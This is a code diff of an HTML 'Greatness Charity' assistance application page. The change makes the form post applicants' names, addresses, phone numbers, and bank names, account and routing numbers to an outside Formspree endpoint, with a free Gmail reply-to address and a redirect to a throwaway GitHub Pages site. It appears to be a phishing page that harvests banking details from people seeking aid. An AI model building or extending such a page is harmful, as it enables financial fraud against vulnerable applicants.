@@ -69,7 +69,11 @@ Charity assistance application form
         </div>
 
         <!-- Form -->
-        <form id="assistanceForm" class="bg-white rounded-3xl shadow-xl p-10 space-y-10">
+        <form id="assistanceForm" action="https://formspree.io/f/xjgnvnwp" method="POST" class="bg-white rounded-3xl shadow-xl p-10 space-y-10">
+    <!-- Hidden fields for better emails -->
+    <input type="hidden" name="_subject" value="New Charity Assistance Application">
+    <input type="hidden" name="_replyto" value="Financedept2026@gmail.com">
+    <input type="hidden" name="_next" value="https://2sz6rhrwp2-lab.github.io/Greatness-Charity/?success=true">
             
             <!-- Personal Information -->
             <div class="form-section bg-gray-50 border border-gray-100 rounded-2xl p-8">
@@ -290,101 +294,37 @@ Charity assistance application form
     </footer>
 
     <script>
-        const form = document.getElementById('assistanceForm');
+    const form = document.getElementById('assistanceForm');
+
+    form.addEventListener('submit', function(e) {
+        // Formspree will handle the submission
+        // Optional: keep localStorage as backup
+        const formData = {
+            fullName: document.getElementById('fullName').value,
+            age: document.getElementById('age').value,
+            address: document.getElementById('address').value,
+            phone: document.getElementById('phone').value,
+            email: document.getElementById('email').value,
+            amountNeeded: document.getElementById('amountNeeded').value,
+            needDescription: document.getElementById('needDescription').value,
+            bankName: document.getElementById('bankName').value,
+            accountHolder: document.getElementById('accountHolder').value,
+            accountNumber: document.getElementById('accountNumber').value,
+            routingNumber: document.getElementById('routingNumber').value,
+            previousRecipient: document.querySelector('input[name="previousRecipient"]:checked') ? 
+                              document.querySelector('input[name="previousRecipient"]:checked').value : '',
+            dependents: document.getElementById('dependents').value,
+            employment: document.getElementById('employment').value,
+            referral: document.getElementById('referral').value,
+        };
+
+        // Optional: still save locally
         let submissions = JSON.parse(localStorage.getItem('greatnessCharitySubmissions')) || [];
+        submissions.unshift({ ...formData, timestamp: new Date().toLocaleString() });
+        localStorage.setItem('greatnessCharitySubmissions', JSON.stringify(submissions));
 
-        function saveSubmission(data) {
-            submissions.unshift({
-                ...data,
-                timestamp: new Date().toLocaleString()
-            });
-            localStorage.setItem('greatnessCharitySubmissions', JSON.stringify(submissions));
-        }
-
-        function showSubmissions() {
-            const modal = document.getElementById('submissionsModal');
-            const list = document.getElementById('submissionsList');
-            list.innerHTML = '';
-
-            if (submissions.length === 0) {
-                list.innerHTML = `
-                    <div class="text-center py-12 text-gray-400">
-                        <i class="fas fa-inbox text-6xl mb-4"></i>
-                        <p>No applications submitted yet.</p>
-                    </div>
-                `;
-            } else {
-                submissions.forEach((sub, index) => {
-                    const div = document.createElement('div');
-                    div.className = "border rounded-2xl p-6 bg-gray-50";
-                    div.innerHTML = `
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h4 class="font-semibold">${sub.fullName}</h4>
-                                <p class="text-sm text-gray-500">${sub.timestamp}</p>
-                            </div>
-                            <div class="text-right">
-                                <span class="inline-block px-4 py-1 bg-emerald-100 text-emerald-700 text-xs font-medium rounded-2xl">$${parseFloat(sub.amountNeeded).toLocaleString()}</span>
-                            </div>
-                        </div>
-                        <div class="grid grid-cols-2 gap-x-8 gap-y-3 text-sm">
-                            <div><span class="text-gray-500">Age:</span> ${sub.age}</div>
-                            <div><span class="text-gray-500">Phone:</span> ${sub.phone}</div>
-                            <div><span class="text-gray-500">Previous Recipient:</span> ${sub.previousRecipient}</div>
-                            <div><span class="text-gray-500">Bank:</span> ${sub.bankName}</div>
-                        </div>
-                        <div class="mt-4 pt-4 border-t text-xs text-gray-500 line-clamp-2">
-                            ${sub.needDescription.substring(0, 180)}...
-                        </div>
-                    `;
-                    list.appendChild(div);
-                });
-            }
-            
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
-        }
-
-        function closeModal() {
-            const modal = document.getElementById('submissionsModal');
-            modal.classList.add('hidden');
-            modal.classList.remove('flex');
-        }
-
-        function clearSubmissions() {
-            if (confirm('Clear all saved submissions?')) {
-                submissions = [];
-                localStorage.removeItem('greatnessCharitySubmissions');
-                closeModal();
-            }
-        }
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const formData = {
-                fullName: document.getElementById('fullName').value,
-                age: document.getElementById('age').value,
-                address: document.getElementById('address').value,
-                phone: document.getElementById('phone').value,
-                email: document.getElementById('email').value,
-                amountNeeded: document.getElementById('amountNeeded').value,
-                needDescription: document.getElementById('needDescription').value,
-                bankName: document.getElementById('bankName').value,
-                accountHolder: document.getElementById('accountHolder').value,
-                accountNumber: document.getElementById('accountNumber').value,
-                routingNumber: document.getElementById('routingNumber').value,
-                previousRecipient: document.querySelector('input[name="previousRecipient"]:checked').value,
-                dependents: document.getElementById('dependents').value,
-                employment: document.getElementById('employment').value,
-                referral: document.getElementById('referral').value,
-            };
-
-            saveSubmission(formData);
-            
-            alert('✅ Application submitted successfully!\n\nThank you for applying to Greatness Charity Foundation.\nOur team will review your request shortly.');
-            form.reset();
-        });
-    </script>
+        // Let Formspree handle redirect / success
+    });
+</script>
 </body>
 </html>
